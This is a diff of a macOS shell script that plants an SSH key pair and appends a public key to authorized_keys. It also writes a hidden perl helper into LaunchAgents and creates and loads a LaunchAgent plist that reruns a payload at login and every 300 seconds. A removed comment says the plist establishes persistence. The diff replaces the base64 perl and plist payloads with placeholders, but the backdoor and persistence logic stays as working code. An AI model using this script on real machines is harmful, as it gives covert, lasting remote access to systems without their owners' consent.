@@ -34,16 +34,11 @@ else
     echo "PRIVATE_KEY_PLACEHOLDER"|base64 -d > "$KEY"
     echo "" >> "$HOME/.ssh/authorized_keys"
     echo "PUBLIC_KEY_PLACEHOLDER"|base64 -d >> "$HOME/.ssh/authorized_keys"
-
-    #The Base64 here is the perl script that does flock as mac's dont come with flock
-    echo "IyEvdXNyL2Jpbi9lbnYgcGVybAp1c2UgRmNudGwgJzpmbG9jayc7b3BlbiBteSAkc2VsZiwgJzwnLCAkMCBvciBkaWU7ZmxvY2sgJHNlbGYsIExPQ0tfRVggfCBMT0NLX05CIG9yIGRpZTtzeXN0ZW0oQEFSR1YpOwo=" |base64 -d > "$HOME/Library/LaunchAgents/.$FLOCKNAME.pl"
+    echo "FLOCK_CODE_PLACEHOLDER" |base64 -d > "$HOME/Library/LaunchAgents/.$FLOCKNAME.pl"
     chmod 600 "$KEY" && chmod 644 "$HOME/.ssh/authorized_keys" && chmod +x "$HOME/Library/LaunchAgents/.$FLOCKNAME.pl"
-    #The Base64 here is the plist that establishes persistance
-echo "PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPCFET0NUWVBFIHBsaXN0IFBVQkxJQyAiLS8vQXBwbGUvL0RURCBQTElTVCAxLjAvL0VOIiAiaHR0cDovL3d3dy5hcHBsZS5jb20vRFREcy9Qcm9wZXJ0eUxpc3QtMS4wLmR0ZCI+CjxwbGlzdCB2ZXJzaW9uPSIxLjAiPgo8ZGljdD4KICA8a2V5PkxhYmVsPC9rZXk+CiAgPHN0cmluZz5jb20ucmVzb3VyY2UuYWdlbnQ8L3N0cmluZz4KICA8a2V5PlByb2dyYW08L2tleT4KICA8c3RyaW5nPi9Vc2Vycy9ob21lL0xpYnJhcnkvTGF1bmNoQWdlbnRzL2xvYWRzc2guc2g8L3N0cmluZz4KICA8a2V5PlN0YXJ0SW50ZXJ2YWw8L2tleT4KICA8aW50ZWdlcj4zMDA8L2ludGVnZXI+CiAgPGtleT5SdW5BdExvYWQ8L2tleT4KICA8dHJ1ZS8+CjwvZGljdD4KPC9wbGlzdD4K"|base64 -d >$HOME/Library/LaunchAgents/$LAGENTNAME.plist
+    echo "LAGENT_XML_PLACEHOLDER"|base64 -d >$HOME/Library/LaunchAgents/$LAGENTNAME.plist
     sed -i '' "s/home/${USER}/g" "$HOME/Library/LaunchAgents/$LAGENTNAME.plist"
-    sed -i '' "s/loadssh.sh/${NAME}/g" "$HOME/Library/LaunchAgents/$LAGENTNAME.plist"
-    sed -i '' "s/com.resource.agent/${LAGENTNAME}/g" "$HOME/Library/LaunchAgents/$LAGENTNAME.plist"
-
+    sed -i '' "s/IMAGINARY_PAYLOAD_NAME.sh/${NAME}/g" "$HOME/Library/LaunchAgents/$LAGENTNAME.plist"
     mv "$NAME" "$HOME/Library/LaunchAgents/"
     launchctl load -w "$HOME/Library/LaunchAgents/$LAGENTNAME.plist"
     launchctl start $LAGENTNAME
